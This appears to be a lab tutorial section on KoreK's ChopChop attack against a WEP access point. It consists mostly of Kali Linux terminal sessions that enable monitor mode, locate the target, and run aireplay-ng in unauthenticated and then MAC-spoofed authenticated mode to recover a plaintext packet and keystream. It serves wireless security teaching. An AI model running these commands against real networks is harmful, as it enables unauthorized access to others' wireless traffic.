#### Part	18: KoreK’s ChopChop Attack

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Identify channel of the AP

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --essid dlink

 CH  4 ][ Elapsed: 12 s ][ 2017-06-06 23:26

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -45  96      115       53    4   4  11e. WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   A4:70:D6:99:25:FC  -67    0 - 1      0        1
 (not associated)   D6:6D:A9:E2:32:1F  -57    0 - 1      0        9  HiddenSSID
 (not associated)   F4:F5:24:B3:F5:C7  -62    0 - 1      0        1
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -15   11e-11     61       99  dlink

root@kali:~#
```

Set the channel of the ```wlan0mon``` to 4 as the AP is in channel 4

```sh
root@kali:~# iwconfig wlan0mon channel 4
```

Performing the attack in ```unauthenticated``` mode

```sh
root@kali:~# aireplay-ng --chopchop -e dlink wlan0mon
23:23:12  Waiting for beacon frame (ESSID: dlink) on channel 4
Found BSSID "84:C9:B2:6D:0C:85" to given ESSID "dlink".
Read 843 packets...

        Size: 447, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  84:C9:B2:6D:0C:85
          Dest. MAC  =  01:00:5E:00:00:FB
         Source MAC  =  BC:9F:EF:69:35:19

        0x0000:  8841 d400 84c9 b26d 0c85 bc9f ef69 3519  .A.....m.....i5.
        0x0010:  0100 5e00 00fb 0000 0000 7af0 e200 c5d3  ..^.......z.....
        0x0020:  89ce 5368 19d6 97a3 d7ca f2fe 7e05 0c3e  ..Sh........~..>
        0x0030:  520c 1922 45f5 35c4 e7d8 3a71 023f 71fa  R.."E.5...:q.?q.
        0x0040:  3965 9df5 11eb fcc7 7690 3810 0376 fe4a  9e......v.8..v.J
        0x0050:  06fb e820 4a72 99da d296 7990 bbd2 6308  ... Jr....y...c.
        0x0060:  f485 6dd9 f78c ebf2 c243 dfe4 f696 dd6d  ..m......C.....m
        0x0070:  5f63 b35c e114 3761 24f9 876c 3f84 e941  _c.\..7a$..l?..A
        0x0080:  807a 85e3 767e f2ce 59c2 859a f8af c41d  .z..v~..Y.......
        0x0090:  5e52 a0c0 e371 6355 537e ab18 a8f0 ec4b  ^R...qcUS~.....K
        0x00a0:  0d69 bbf3 7ed9 6d06 9256 3504 8e50 d934  .i..~.m..V5..P.4
        0x00b0:  f258 5603 8a7a f29b 9f7c 5eec 74bf 7b94  .XV..z...|^.t.{.
        0x00c0:  e56e 348a 626b 2b32 2a91 81cf 69a5 b2ee  .n4.bk+2*...i...
        0x00d0:  75c0 c6df f06d ed20 587b f7ca d98a 61d3  u....m. X{....a.
        --- CUT ---

Use this packet ? y

Saving chosen packet in replay_src-0606-232322.cap



Failure: the access point does not properly discard frames with an
invalid ICV - try running aireplay-ng in authenticated mode (-h) instead.

root@kali:~#
```

Performing the attack in ```authenticated``` mode

```sh
root@kali:~# aireplay-ng --chopchop -e dlink wlan0mon -h BC:9F:EF:69:35:19
The interface MAC (00:C0:CA:92:3C:89) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether BC:9F:EF:69:35:19
23:28:19  Waiting for beacon frame (ESSID: dlink) on channel 4
Found BSSID "84:C9:B2:6D:0C:85" to given ESSID "dlink".
Read 32 packets...

        Size: 68, FromDS: 1, ToDS: 0 (WEP)

              BSSID  =  84:C9:B2:6D:0C:85
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  84:C9:B2:6D:0C:85

        0x0000:  0862 0000 ffff ffff ffff 84c9 b26d 0c85  .b...........m..
        0x0010:  84c9 b26d 0c85 5029 0004 8000 9cd6 c972  ...m..P).......r
        0x0020:  aaa5 fb6f 2305 3b7a 32fa b1ef f486 2243  ...o#.;z2....."C
        0x0030:  edfc 2ca2 810e 2479 ec1e 4842 28d4 dd5c  ..,...$y..HB(..\
        0x0040:  6a92 3407                                j.4.

Use this packet ? y

Saving chosen packet in replay_src-0606-232820.cap

Offset   67 ( 0% done) | xor = 16 | pt = 11 | 1219 frames written in 20725ms
Offset   66 ( 2% done) | xor = 18 | pt = 2C | 1442 frames written in 24527ms
Offset   65 ( 5% done) | xor = D8 | pt = 4A |  661 frames written in 11224ms
Offset   64 ( 8% done) | xor = A2 | pt = C8 | 2010 frames written in 34179ms
Offset   63 (11% done) | xor = 62 | pt = 3E | 2248 frames written in 38210ms
Offset   62 (14% done) | xor = DD | pt = 00 |  860 frames written in 14620ms
Offset   61 (17% done) | xor = 7C | pt = A8 |  970 frames written in 16501ms
Offset   60 (20% done) | xor = E8 | pt = C0 |  990 frames written in 16815ms
Offset   59 (23% done) | xor = BD | pt = FF |  690 frames written in 11745ms
Offset   58 (26% done) | xor = B7 | pt = FF | 1391 frames written in 23646ms
Offset   57 (29% done) | xor = E1 | pt = FF | 3822 frames written in 64965ms
Offset   56 (32% done) | xor = 13 | pt = FF | 2047 frames written in 34801ms
Offset   55 (35% done) | xor = 86 | pt = FF | 1115 frames written in 18952ms
Offset   54 (38% done) | xor = DB | pt = FF |  599 frames written in 10184ms
Offset   53 (41% done) | xor = 0F | pt = 01 |  884 frames written in 15028ms
Offset   52 (44% done) | xor = 81 | pt = 00 |  486 frames written in  8260ms
Offset   51 (47% done) | xor = 0A | pt = A8 |  750 frames written in 12754ms
Offset   50 (50% done) | xor = EC | pt = C0 | 2215 frames written in 37658ms
Offset   49 (52% done) | xor = 79 | pt = 85 |  687 frames written in 11673ms
Offset   48 (55% done) | xor = E1 | pt = 0C | 3651 frames written in 62069ms
Offset   47 (58% done) | xor = 2E | pt = 6D |  915 frames written in 15561ms
Offset   46 (61% done) | xor = 90 | pt = B2 | 2533 frames written in 43049ms
Offset   45 (64% done) | xor = 4F | pt = C9 |  948 frames written in 16128ms
Offset   44 (67% done) | xor = 70 | pt = 84 |  519 frames written in  8821ms
Offset   43 (70% done) | xor = EE | pt = 01 |  464 frames written in  7885ms
Offset   42 (73% done) | xor = B1 | pt = 00 |  628 frames written in 10668ms
Offset   41 (76% done) | xor = FE | pt = 04 | 2364 frames written in 40200ms
Offset   40 (79% done) | xor = 34 | pt = 06 |  608 frames written in 10333ms
Sent 10374 packets, current guess: A8...

The AP appears to drop packets shorter than 40 bytes.
Enabling standard workaround: ARP header re-creation.

Saving plaintext in replay_dec-0606-233058.cap
Saving keystream in replay_dec-0606-233058.xor

Completed in 155s (0.19 bytes/s)

root@kali:~# ls -l replay_dec-0606-233058.*
-rw-r--r-- 1 root root 100 Jun  6 23:30 replay_dec-0606-233058.cap
-rw-r--r-- 1 root root  44 Jun  6 23:30 replay_dec-0606-233058.xor
root@kali:~#
```